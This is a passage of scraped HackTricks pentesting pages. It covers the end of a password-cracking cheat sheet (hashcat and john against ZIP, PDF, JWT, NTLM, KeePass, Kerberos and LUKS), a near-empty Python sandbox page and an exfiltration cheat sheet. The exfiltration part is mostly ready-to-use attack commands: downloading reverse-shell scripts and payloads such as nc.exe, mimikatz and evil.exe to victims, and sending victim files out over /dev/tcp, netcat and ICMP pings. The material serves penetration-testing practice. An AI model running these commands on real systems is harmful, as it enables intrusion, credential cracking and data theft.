PDF...)\n‚Äã\nhttps://crackstation.net/\n(Hashes)\n‚Äã\nhttps://md5decrypt.net/\n(MD5)\n‚Äã\nhttps://gpuhash.me/\n(Hashes and file hashes)\n‚Äã\nhttps://hashes.org/search.php\n(Hashes)\n‚Äã\nhttps://www.cmd5.org/\n(Hashes)\n‚Äã\nhttps://hashkiller.co.uk/Cracker\n(MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)\n‚Äã\nhttps://www.md5online.org/md5-decrypt.html\n(MD5)\n‚Äã\nhttp://reverse-hash-lookup.online-domain-tools.com/\n‚Äã\nCheck this out before trying to brute force a Hash.\nZIP\n#sudo apt-get install fcrackzip\nfcrackzip\n-u\n-D\n-p\n'/usr/share/wordlists/rockyou.txt'\nchall.zip\nzip2john file.zip\n>\nzip.john\njohn zip.john\n#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$\nhashcat.exe\n-m\n13600\n-a\n0\n.\n\\\nhashzip.txt .\n\\\nwordlists\n\\\nrockyou.txt\n.\n\\\nhashcat.exe\n-m\n13600\n-i\n-a\n0\n.\n\\\nhashzip.txt\n#Incremental attack\nKnown plaintext zip attack\nYou need to know the\nplaintext\n(or part of the plaintext)\nof a file contained inside\nthe encrypted zip. You can check\nfilenames and size of files contained inside\nan encrypted zip running:\n7z l encrypted.zip\nDownload\nbkcrack\nfrom the releases page.\n# You need to create a zip file containing only the file that is inside the encrypted zip\nzip\nplaintext.zip plaintext.file\n‚Äã\n./bkcrack\n-C\n<\nencrypted.zip\n>\n-c\n<\nplaintext.file\n>\n-P\n<\nplaintext.zip\n>\n-p\n<\nplaintext.file\n>\n# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18\n# With that key you can create a new zip file with the content of encrypted.zip\n# but with a different pass that you set (so you can decrypt it)\n./bkcrack\n-C\n<\nencrypted.zip\n>\n-k\n7b549874 ebc25ec5 7e465e18\n-U\nunlocked.zip new_pwd\nunzip\nunlocked.zip\n#User new_pwd as password\n7z\ncat\n/usr/share/wordlists/rockyou.txt\n|\n7za t backup.7z\n#Download and install requirements for 7z2john\nwget\nhttps://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl\napt-get\ninstall\nlibcompress-raw-lzma-perl\n./7z2john.pl file.7z\n>\n7zhash.john\nPDF\napt-get\ninstall\npdfcrack\npdfcrack encrypted.pdf\n-w\n/usr/share/wordlists/rockyou.txt\n#pdf2john didn't work well, john didn't know which hash type was\n# To permanently decrypt the pdf\nsudo\napt-get\ninstall\nqpdf\nqpdf\n--password\n=<\nPASSWORD\n>\n--decrypt\nencrypted.pdf plaintext.pdf\nPDF Owner Password\nTo crack a PDF Owner password check this:\nhttps://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/\n‚Äã\nJWT\ngit\nclone https://github.com/Sjord/jwtcrack.git\ncd\njwtcrack\n‚Äã\n#Bruteforce using crackjwt.py\npython crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt\n‚Äã\n#Bruteforce using john\npython jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc\n>\njwt.john\njohn jwt.john\n#It does not work with Kali-John\nNTLM cracking\nFormat:USUARIO:ID:HASH_LM:HASH_NT:::\njohn\n--wordlist\n=\n/usr/share/wordlists/rockyou.txt\n--format\n=\nNT file_NTLM.hashes\nhashcat\n-a\n0\n-m\n1000\n--username\nfile_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot\nKeepass\nsudo\napt-get\ninstall\n-y\nkpcli\n#Install keepass tools like keepass2john\nkeepass2john file.kdbx\n>\nhash\n#The keepass is only using password\nkeepass2john\n-k\n<\nfile-password\n>\nfile.kdbx\n>\nhash\n# The keepass is also using a file as a needed credential\n#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john\njohn\n--wordlist\n=\n/usr/share/wordlists/rockyou.txt\nhash\nKeberoasting\njohn\n--format\n=\nkrb5tgs\n--wordlist\n=\npasswords_kerb.txt hashes.kerberoast\nhashcat\n-m\n13100\n--force\n-a\n0\nhashes.kerberoast passwords_kerb.txt\n./tgsrepcrack.py wordlist.txt\n1\n-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi\nLucks image\nMethod 1\nInstall:\nhttps://github.com/glv2/bruteforce-luks\n‚Äã\nbruteforce-luks\n-f\n./list.txt ./backup.img\ncryptsetup luksOpen backup.img mylucksopen\nls\n/dev/mapper/\n#You should find here the image mylucksopen\nmount\n/dev/mapper/mylucksopen /mnt\nMethod 2\ncryptsetup luksDump backup.img\n#Check that the payload offset is set to 4096\ndd\nif\n=\nbackup.img\nof\n=\nluckshash\nbs\n=\n512\ncount\n=\n4097\n#Payload offset +1\nhashcat\n-m\n14600\n-a\n0\nluckshash  wordlists/rockyou.txt\ncryptsetup luksOpen backup.img mylucksopen\nls\n/dev/mapper/\n#You should find here the image mylucksopen\nmount\n/dev/mapper/mylucksopen /mnt\nAnother Luks BF tutorial:\nhttp://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1\n‚Äã\nMysql\n#John hash format\n<\nUSERNAME\n>\n:\n$mysqlna\n$\n<\nCHALLENGE\n>\n*\n<\nRESPONSE\n>\ndbuser:\n$mysqlna$112233445566778899aabbccddeeff1122334455\n*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d\nPGP/GPG Private key\ngpg2john private_pgp.key\n#This will generate the hash and save it in a file\njohn\n--wordlist\n=\n/usr/share/wordlists/rockyou.txt ./hash\nCisco\nDPAPI Master Key\nUse\nhttps://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py\nand then john\nOpen Office Pwd Protected Column\nIf you have an xlsx file with a column protected by a password you can unprotect it:\nUpload it to google drive\nand the password will be automatically removed\nTo\nremove\nit\nmanually\n:\nunzip\nfile.xlsx\ngrep\n-R\n\"sheetProtection\"\n./*\n# Find something like: <sheetProtection algorithmName=\"SHA-512\"\nhashValue\n=\n\"hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg\"\nsaltValue\n=\n\"U9oZfaVCkz5jWdhs9AA8nA\"\nspinCount\n=\n\"100000\"\nsheet\n=\n\"1\"\nobjects\n=\n\"1\"\nscenarios\n=\n\"1\"\n/\n>\n# Remove that line and rezip the file\nzip\n-r\nfile.xls\n.\nPFX Certificates\n# From https://github.com/Ridter/p12tool\n./p12tool crack\n-c\nstaff.pfx\n-f\n/usr/share/wordlists/rockyou.txt\n# From https://github.com/crackpkcs12/crackpkcs12\ncrackpkcs12\n-d\n/usr/share/wordlists/rockyou.txt ./cert.pfx\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nTools\nHash examples:\nhttps://openwall.info/wiki/john/sample-hashes\n‚Äã\nHash-identifier\nhash-identifier\n>\n<\nHASH\n>\nWordlists\nRockyou\n‚Äã\nProbable-Wordlists\n‚Äã\n‚Äã\nKaonashi\n‚Äã\n‚Äã\nSeclists - Passwords\n‚Äã\nWordlist Generation Tools\n‚Äã\nkwprocessor\n:\nAdvanced keyboard-walk generator with configurable base chars, keymap and routes.\nkwp64.exe basechars\n\\\ncustom.base keymaps\n\\\nuk.keymap routes\n\\\n2\n-to-10-max-3-direction-changes.route\n-o\nD:\n\\\nTools\n\\\nkeywalk.txt\nJohn mutation\nRead\n/etc/john/john.conf\nand configure it\njohn\n--wordlist\n=\nwords.txt\n--rules\n--stdout\n>\nw_mutated.txt\njohn\n--wordlist\n=\nwords.txt\n--rules\n=\nall\n--stdout\n>\nw_mutated.txt\n#Apply all rules\nHashcat\nHashcat attacks\nWordlist attack\n(\n-a 0\n) with rules\nHashcat\nalready comes with a\nfolder containing rules\nbut you can find\nother interesting rules here\n.\nhashcat.exe -a 0 -m 1000 C:\\Temp\\ntlm.txt .\\rockyou.txt -r rules\\best64.rule\nWordlist combinator\nattack\nIt's possible to\ncombine 2 wordlists into 1\nwith hashcat.\nIf list 1 contained the word\n\"hello\"\nand the second contained 2 lines with the words\n\"world\"\nand\n\"earth\"\n. The words\nhelloworld\nand\nhelloearth\nwill be generated.\n# This will combine 2 wordlists\nhashcat.exe\n-a\n1\n-m\n1000\nC:\n\\\nTemp\n\\\nntlm.txt .\n\\\nwordlist1.txt .\n\\\nwordlist2.txt\n‚Äã\n# Same attack as before but adding chars in the newly generated words\n# In the previous example this will generate:\n## hello-world!\n## hello-earth!\nhashcat.exe\n-a\n1\n-m\n1000\nC:\n\\\nTemp\n\\\nntlm.txt .\n\\\nwordlist1.txt .\n\\\nwordlist2.txt\n-j\n$-\n-k\n$!\nMask attack\n(\n-a 3\n)\n# Mask attack with simple mask\nhashcat.exe\n-a\n3\n-m\n1000\nC:\n\\\nTemp\n\\\nntlm.txt ?u?l?l?l?l?l?l?l?d\n‚Äã\nhashcat\n--help\n#will show the charsets and are as follows\n?\n|\nCharset\n===+=========\nl\n|\nabcdefghijklmnopqrstuvwxyz\nu\n|\nABCDEFGHIJKLMNOPQRSTUVWXYZ\nd\n|\n0123456789\nh\n|\n0123456789abcdef\nH\n|\n0123456789ABCDEF\ns\n|\n!\n\"#$%\n&\n'\n()\n*+,-./:\n;\n<=>\n?@\n[\\]\n^_`\n{\n|\n}\n~\na\n|\n?l?u?d?s\nb\n|\n0x00 - 0xff\n‚Äã\n# Mask attack declaring custom charset\nhashcat.exe\n-a\n3\n-m\n1000\nC:\n\\\nTemp\n\\\nntlm.txt\n-1\n?d?s ?u?l?l?l?l?l?l?l?1\n## -1 ?d?s defines a custom charset (digits and specials).\n## ?u?l?l?l?l?l?l?l?1 is the mask, where \"?1\" is the custom charset.\n‚Äã\n# Mask attack with variable password length\n## Create a file called masks.hcmask with this content:\n?d?s,?u?l?l?l?l?1\n?d?s,?u?l?l?l?l?l?1\n?d?s,?u?l?l?l?l?l?l?1\n?d?s,?u?l?l?l?l?l?l?l?1\n?d?s,?u?l?l?l?l?l?l?l?l?1\n## Use it to crack the password\nhashcat.exe\n-a\n3\n-m\n1000\nC:\n\\\nTemp\n\\\nntlm.txt .\n\\\nmasks.hcmask\nWordlist + Mask (\n-a 6\n) / Mask + Wordlist (\n-a 7\n) attack\n# Mask numbers will be appended to each word in the wordlist\nhashcat.exe\n-a\n6\n-m\n1000\nC:\n\\\nTemp\n\\\nntlm.txt\n\\\nwordlist.txt ?d?d?d?d\n‚Äã\n# Mask numbers will be prepended to each word in the wordlist\nhashcat.exe\n-a\n7\n-m\n1000\nC:\n\\\nTemp\n\\\nntlm.txt ?d?d?d?d\n\\\nwordlist.txt\nHashcat modes\nhashcat --example-hashes\n|\ngrep\n-B1\n-A2\n\"NTLM\"\nCracking Linux Hashes - /etc/shadow file\n500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems\n3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems\n7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems\n1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems\nCracking Windows Hashes\n3000 | LM                                               | Operating-Systems\n1000 | NTLM                                             | Operating-Systems\nCracking Common Application Hashes\n900 | MD4                                              | Raw Hash\n0 | MD5                                              | Raw Hash\n5100 | Half MD5                                         | Raw Hash\n100 | SHA1                                             | Raw Hash\n10800 | SHA-384                                          | Raw Hash\n1400 | SHA-256                                          | Raw Hash\n1700 | SHA-512                                          | Raw Hash\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nPrevious\nInteresting Windows Registry Keys\nNext\n- Generic Methodologies & Resources\nPython Sandbox Escape & Pyscript\nLast modified\n1mo ago"
    },
    {
        "title": "Python Sandbox Escape & Pyscript",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/python",
        "text": "Python Sandbox Escape & Pyscript\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\nInteresting pages to check:\n‚Äã\nPyscript hacking tricks\n‚Äã\n‚Äã\nPython deserializations\n‚Äã\n‚Äã\nTricks to bypass python sandboxes\n‚Äã\n‚Äã\nBasic python web requests syntax\n‚Äã\n‚Äã\nBasic python syntax and libraries\n‚Äã\nUse\nTrickest\nto easily build and\nautomate workflows\npowered by the world's\nmost advanced\ncommunity tools.\nGet Access Today:\nWorkflow-powered solution for Bug Bounty, Pentesting, SecOps | Trickest\nTrickest\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nGeneric Methodologies & Resources -\nPrevious\nBrute Force - CheatSheet\nNext\nBypass Python sandboxes\nLast modified\n2mo ago"
    },
    {
        "title": "Exfiltration",
        "url": "https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration",
        "text": "Exfiltration\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nCommonly whitelisted domains to exfiltrate information\nCheck\nhttps://lots-project.com/\nto find commonly whitelisted domains that can be abused\nCopy&Paste Base64\nLinux\nbase64\n-w0\n<\nfile\n>\n#Encode file\nbase64\n-d\nfile\n#Decode file\nWindows\ncertutil -encode payload.dll payload.b64\ncertutil -decode payload.b64 payload.dll\nHTTP\nLinux\nwget\n10.10\n.14.14:8000/tcp_pty_backconnect.py\n-O\n/dev/shm/.rev.py\nwget\n10.10\n.14.14:8000/tcp_pty_backconnect.py\n-P\n/dev/shm\ncurl\n10.10\n.14.14:8000/shell.py\n-o\n/dev/shm/shell.py\nfetch\n10.10\n.14.14:8000/shell.py\n#FreeBSD\nWindows\ncertutil\n-urlcache\n-split\n-f\nhttp://webserver/payload.b64 payload.b64\nbitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\n\\\ndownloads\n\\\nexamplefile.pdf\n‚Äã\n#PS\n(\nNew-Object Net.WebClient\n)\n.DownloadFile\n(\n\"http://10.10.14.2:80/taskkill.exe\"\n,\n\"C:\\Windows\\Temp\n\\t\naskkill.exe\"\n)\nInvoke-WebRequest\n\"http://10.10.14.2:80/taskkill.exe\"\n-OutFile\n\"taskkill.exe\"\nwget\n\"http://10.10.14.2/nc.bat.exe\"\n-OutFile\n\"C:\\ProgramData\\unifivideo\n\\t\naskkill.exe\"\n‚Äã\nImport-Module BitsTransfer\nStart-BitsTransfer\n-Source\n$url\n-Destination\n$output\n#OR\nStart-BitsTransfer\n-Source\n$url\n-Destination\n$output\n-Asynchronous\nUpload files\n‚Äã\nSimpleHttpServerWithFileUploads\n‚Äã\n‚Äã\nSimpleHttpServer printing GET and POSTs (also headers)\n‚Äã\nPython module\nuploadserver\n:\n# Listen to files\npython3\n-m\npip\ninstall\n--user\nuploadserver\npython3\n-m\nuploadserver\n# With basic auth:\n# python3 -m uploadserver --basic-auth hello:world\n‚Äã\n# Send a file\ncurl\n-X\nPOST http://HOST/upload\n-H\n-F\n'\n[email¬†protected]\n'\n# With basic auth:\n# curl -X POST http://HOST/upload -H -F '\n[email¬†protected]\n' -u hello:world\nHTTPS Server\n# from https://gist.github.com/dergachev/7028596\n# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/\n# generate server.xml with the following command:\n#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes\n# run as follows:\n#    python simple-https-server.py\n# then in your browser, visit:\n#    https://localhost:443\n‚Äã\n### PYTHON 2\nimport\nBaseHTTPServer\n,\nSimpleHTTPServer\nimport\nssl\n‚Äã\nhttpd\n=\nBaseHTTPServer\n.\nHTTPServer\n((\n'0.0.0.0'\n,\n443\n),\nSimpleHTTPServer\n.\nSimpleHTTPRequestHandler\n)\nhttpd\n.\nsocket\n=\nssl\n.\nwrap_socket\n(\nhttpd\n.\nsocket\n,\ncertfile\n=\n'./server.pem'\n,\nserver_side\n=\nTrue\n)\nhttpd\n.\nserve_forever\n()\n###\n‚Äã\n### PYTHON3\nfrom\nhttp\n.\nserver\nimport\nHTTPServer\n,\nBaseHTTPRequestHandler\nimport\nssl\n‚Äã\nhttpd\n=\nHTTPServer\n((\n'0.0.0.0'\n,\n443\n),\nBaseHTTPRequestHandler\n)\nhttpd\n.\nsocket\n=\nssl\n.\nwrap_socket\n(\nhttpd\n.\nsocket\n,\ncertfile\n=\n\"./server.pem\"\n,\nserver_side\n=\nTrue\n)\nhttpd\n.\nserve_forever\n()\n###\n‚Äã\n### USING FLASK\nfrom\nflask\nimport\nFlask\n,\nredirect\n,\nrequest\nfrom\nurllib\n.\nparse\nimport\nquote\napp\n=\nFlask\n(\n__name__\n)\n@app\n.\nroute\n(\n'/'\n)\ndef\nroot\n():\nprint\n(\nrequest\n.\nget_json\n())\nreturn\n\"OK\"\nif\n__name__\n==\n\"__main__\"\n:\napp\n.\nrun\n(\nssl_context\n=\n'adhoc'\n,\ndebug\n=\nTrue\n,\nhost\n=\n\"0.0.0.0\"\n,\nport\n=\n8443\n)\n###\nFTP\nFTP server (python)\npip3\ninstall\npyftpdlib\npython3\n-m\npyftpdlib\n-p\n21\nFTP server (NodeJS)\nsudo npm install -g ftp-srv --save\nftp-srv ftp://0.0.0.0:9876 --root /tmp\nFTP server (pure-ftp)\napt-get\nupdate\n&&\napt-get\ninstall\npure-ftp\n#Run the following script to configure the FTP server\n#!/bin/bash\ngroupadd\nftpgroup\nuseradd\n-g\nftpgroup\n-d\n/dev/null\n-s\n/etc ftpuser\npure-pwd\nuseradd\nfusr\n-u\nftpuser\n-d\n/ftphome\npure-pw mkdb\ncd\n/etc/pure-ftpd/auth/\nln\n-s\n..\n/conf/PureDB 60pdb\nmkdir\n-p\n/ftphome\nchown\n-R\nftpuser:ftpgroup /ftphome/\n/etc/init.d/pure-ftpd restart\nWindows\nclient\n#Work well with python. With pure-ftp use fusr:ftp\necho\nopen\n10.11\n.0.41\n21\n>\nftp.txt\necho\nUSER\nanonymous\n>>\nftp.txt\necho\nanonymous\n>>\nftp.txt\necho\nbin\n>>\nftp.txt\necho\nGET mimikatz.exe\n>>\nftp.txt\necho\nbye\n>>\nftp.txt\nftp\n-n\n-v\n-s:ftp.txt\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\nSMB\nKali as server\nkali_op\n1\n>\nimpacket-smbserver\n-smb2support\nkali\n`\npwd\n`\n# Share current directory\nkali_op\n2\n>\nsmbserver.py\n-smb2support\nname /path/folder\n# Share a folder\n#For new Win10 versions\nimpacket-smbserver\n-smb2support\n-user\ntest\n-password\ntest\ntest\n`\npwd\n`\nOr create a smb share\nusing samba\n:\napt-get\ninstall\nsamba\nmkdir\n/tmp/smb\nchmod\n777\n/tmp/smb\n#Add to the end of /etc/samba/smb.conf this:\n[\npublic\n]\ncomment\n=\nSamba on Ubuntu\npath\n=\n/tmp/smb\nread\nonly\n=\nno\nbrowsable\n=\nyes\nguest ok\n=\nYes\n#Start samba\nservice\nsmbd restart\nWindows\nCMD-Wind\n>\n\\\\\n10.10\n.14.14\n\\\npath\n\\\nto\n\\\nexe\nCMD-Wind\n>\nnet use z:\n\\\\\n10.10\n.14.14\n\\\ntest /user:test\ntest\n#For SMB using credentials\n‚Äã\nWindPS-\n1\n>\nNew-PSDrive\n-Name\n\"new_disk\"\n-PSProvider\n\"FileSystem\"\n-Root\n\"\n\\\\\n10.10.14.9\\kali\"\nWindPS-\n2\n>\ncd\nnew_disk:\nSCP\nThe attacker has to have SSHd running.\nscp\n<\nusername\n>\n@\n<\nAttacker_IP\n>\n:\n<\ndirectory\n>\n/\n<\nfilename\n>\nSSHFS\nIf the victim has SSH, the attacker can mount a directory from the victim to the attacker.\nsudo\napt-get\ninstall\nsshfs\nsudo\nmkdir\n/mnt/sshfs\nsudo\nsshfs\n-o\nallow_other,default_permissions\n<\nTarget username\n>\n@\n<\nTarget IP address\n>\n:\n<\nFull path to folder\n>\n/ /mnt/sshfs/\nNC\nnc\n-lvnp\n4444\n>\nnew_file\nnc\n-vn\n<\nIP\n>\n4444\n<\nexfil_file\n/dev/tcp\nDownload file from victim\nnc\n-lvnp\n80\n>\nfile\n#Inside attacker\ncat\n/path/file\n>\n/dev/tcp/10.10.10.10/80\n#Inside victim\nUpload file to victim\nnc\n-w5\n-lvnp\n80\n<\nfile_to_send.txt\n# Inside attacker\n# Inside victim\nexec\n6\n<\n/dev/tcp/10.10.10.10/4444\ncat\n<\n&6\n>\nfile.txt\nthanks to\n@BinaryShadow_\nICMP\n# To exfiltrate the content of a file via pings you can do:\nxxd\n-p\n-c\n4\n/path/file/exfil\n|\nwhile\nread\nline\n;\ndo\nping\n-c\n1\n-p\n$line\n<\nIP attacker\n>\n;\ndone\n#This will 4bytes per ping packet (you could probably increase this until 16)\nfrom\nscapy\n.\nall\nimport\n*\n#This is ippsec receiver created in the HTB machine Mischief\ndef\nprocess_packet\n(\npkt\n):\nif\npkt\n.\nhaslayer\n(\nICMP\n):\nif\npkt\n[\nICMP\n].\ntype\n==\n0\n:\ndata\n=\npkt\n[\nICMP\n].\nload\n[\n-\n4\n:]\n#Read the 4bytes interesting\nprint\n(\nf\"\n{\ndata\n.\ndecode\n(\n'utf-8'\n)}\n\"\n,\nflush\n=\nTrue\n,\nend\n=\n\"\"\n)\n‚Äã\nsniff\n(\niface\n=\n\"tun0\"\n,\nprn\n=\nprocess_packet\n)\nSMTP\nIf you can send data to an SMTP server, you can create an SMTP to receive the data with python:\nsudo\npython\n-m\nsmtpd\n-n\n-c\nDebuggingServer :25\nTFTP\nBy default in XP and 2003 (in others it needs to be explicitly added during installation)\nIn Kali,\nstart TFTP server\n:\n#I didn't get this options working and I prefer the python option\nmkdir\n/tftp\natftpd\n--daemon\n--port\n69\n/tftp\ncp\n/path/tp/nc.exe /tftp\nTFTP server in python:\npip\ninstall\nptftpd\nptftpd\n-p\n69\ntap0\n.\n# ptftp -p <PORT> <IFACE> <FOLDER>\nIn\nvictim\n, connect to the Kali server:\ntftp\n-i\n<\nKALI-IP\n>\nget nc.exe\nPHP\nDownload a file with a PHP oneliner:\necho\n\"<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>\"\n>\ndown2.php\nVBScript\nAttacker\n>\npython\n-m\nSimpleHTTPServer\n80\nVictim\necho\nstrUrl\n=\nWScript.Arguments.Item\n(\n0\n)\n>\nwget.vbs\necho\nStrFile\n=\nWScript.Arguments.Item\n(\n1\n)\n>>\nwget.vbs\necho\nConst HTTPREQUEST_PROXYSETTING_DEFAULT\n=\n0\n>>\nwget.vbs\necho\nConst HTTPREQUEST_PROXYSETTING_PRECONFIG\n=\n0\n>>\nwget.vbs\necho\nConst HTTPREQUEST_PROXYSETTING_DIRECT\n=\n1\n>>\nwget.vbs\necho\nConst HTTPREQUEST_PROXYSETTING_PROXY\n=\n2\n>>\nwget.vbs\necho\nDim http, varByteArray, strData, strBuffer, lngCounter, fs, ts\n>>\nwget.vbs\necho\nErr.Clear\n>>\nwget.vbs\necho\nSet http\n=\nNothing\n>>\nwget.vbs\necho\nSet http\n=\nCreateObject\n(\n\"WinHttp.WinHttpRequest.5.1\"\n)\n>>\nwget.vbs\necho\nIf http Is Nothing Then Set http\n=\nCreateObject\n(\n\"WinHttp.WinHttpRequest\"\n)\n>>\nwget.vbs\necho\nIf http Is Nothing Then Set http\n=\nCreateObject\n(\n\"MSXML2.ServerXMLHTTP\"\n)\n>>\nwget.vbs\necho\nIf http Is Nothing Then Set http\n=\nCreateObject\n(\n\"Microsoft.XMLHTTP\"\n)\n>>\nwget.vbs\necho\nhttp.Open\n\"GET\"\n, strURL, False\n>>\nwget.vbs\necho\nhttp.Send\n>>\nwget.vbs\necho\nvarByteArray\n=\nhttp.ResponseBody\n>>\nwget.vbs\necho\nSet http\n=\nNothing\n>>\nwget.vbs\necho\nSet fs\n=\nCreateObject\n(\n\"Scripting.FileSystemObject\"\n)\n>>\nwget.vbs\necho\nSet ts\n=\nfs.CreateTextFile\n(\nStrFile, True\n)\n>>\nwget.vbs\necho\nstrData\n=\n\"\"\n>>\nwget.vbs\necho\nstrBuffer\n=\n\"\"\n>>\nwget.vbs\necho\nFor lngCounter\n=\n0\nto UBound\n(\nvarByteArray\n)\n>>\nwget.vbs\necho\nts.Write Chr\n(\n255\nAnd Ascb\n(\nMidb\n(\nvarByteArray,lngCounter +\n1\n,\n1\n)))\n>>\nwget.vbs\necho\nNext\n>>\nwget.vbs\necho\nts.Close\n>>\nwget.vbs\ncscript wget.vbs http://10.11.0.5/evil.exe evil.exe\nDebug.exe\nThis is a crazy technique that works on Windows 32 bit machines. The idea is to use the\ndebug.exe\nprogram. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take binaries, like\nnetcat\n. And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with\ndebug.exe\n.\nDebug.exe\ncan only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that:\nupx -9 nc.exe\nNow it only weighs 29 kb. Perfect. So now let's disassemble it:\nwine exe2bat.exe nc.exe nc.txt\nNow we just copy-paste the text into our windows-shell. And it will automatically create a file called nc.exe\nDNS\n‚Äã\nhttps://github.com/62726164/dns-exfil\n‚Äã\nFind vulnerabilities that matter most so you can fix them faster. Intruder tracks your attack surface, runs proactive threat scans, finds issues across your whole tech stack, from APIs to web apps and cloud systems.\nTry it for free\ntoday.\nIntruder | An Effortless Vulnerability Scanner\n‚Äã\n‚òÅÔ∏è HackTricks Cloud 